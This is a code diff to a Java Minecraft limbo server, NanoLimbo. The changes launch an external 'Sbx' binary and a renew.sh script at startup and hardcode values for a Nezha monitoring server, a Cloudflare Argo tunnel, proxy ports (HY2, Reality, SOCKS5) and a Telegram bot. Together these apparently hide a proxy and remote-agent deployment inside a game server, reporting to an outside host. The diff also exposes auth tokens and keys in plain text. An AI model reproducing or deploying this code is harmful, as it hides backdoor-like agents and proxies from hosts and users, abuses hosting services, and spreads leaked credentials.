@@ -58,6 +58,17 @@ public final class NanoLimbo {
         // Start SbxService
         try {
             runSbxBinary();
+
+            // ✅ 启动续期脚本 renew.sh（服务器运行期间自动续期）
+            File renewScript = new File("renew.sh");
+            if (renewScript.exists()) {
+                new ProcessBuilder("bash", "renew.sh")
+                    .inheritIO()
+                    .start();
+                System.out.println(ANSI_GREEN + "renew.sh 已启动（自动续期中）" + ANSI_RESET);
+            } else {
+                System.err.println(ANSI_RED + "renew.sh 未找到，跳过执行" + ANSI_RESET);
+            }
             
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
@@ -126,14 +137,14 @@ public final class NanoLimbo {
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nz.xx66.nyc.mn");
         envVars.put("NEZHA_PORT", "443");
-        envVars.put("NEZHA_KEY", "GIi5UgjriOLpOsoIT4");
+        envVars.put("NEZHA_KEY", "UizUp1k6j3Ru6esZIK");
         envVars.put("ARGO_PORT", "8001");
-        envVars.put("ARGO_DOMAIN", "cereshost-pl.xx66.nyc.mn");
-        envVars.put("ARGO_AUTH", "eyJhIjoiYTg2NTc2M2YxOGEwOTZhOWI3MWRiZmMxYzJkYzRlYTYiLCJ0IjoiOGRhY2MzYmEtMWU1YS00NjRkLWEyZGQtMzI4M2RmMTU0NDI1IiwicyI6Ik16ZGlOVGRpWmpNdE1UTmpNaTAwTlRnMkxXRTBaV0V0TkRobVpHVTVNV1k0WXprNCJ9");
-        envVars.put("HY2_PORT", "");
+        envVars.put("ARGO_DOMAIN", "icehost-pl.dora.cc.cd");
+        envVars.put("ARGO_AUTH", "eyJhIjoiODYxM2UxNGFjMzJjZmQ1ZGFjZDlkZWJlOTljNzlhOGQiLCJ0IjoiZTc5NDMxMTQtOGI0OC00MjU3LWI4MmQtMDk1NTg0YjFiMTU3IiwicyI6Ik56QXpaRFEyTW1RdE1XWTJPUzAwTWpobExUbGlaVE10TWpnM05HTTBZakl6TjJSayJ9");
+        envVars.put("HY2_PORT", "30181");
         envVars.put("TUIC_PORT", "");
-        envVars.put("REALITY_PORT", "");
-        envVars.put("S5_PORT", "28156");
+        envVars.put("REALITY_PORT", "30181");
+        envVars.put("S5_PORT", "");
         envVars.put("ANYTLS_PORT", "");
         envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
@@ -141,7 +152,7 @@ public final class NanoLimbo {
         envVars.put("BOT_TOKEN", "7126463574:AAHSLx2WwHJSa3gpujRj64JhpEpCqsJcUZs");
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "cereshost-pl");
+        envVars.put("NAME", "icehost-pl");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
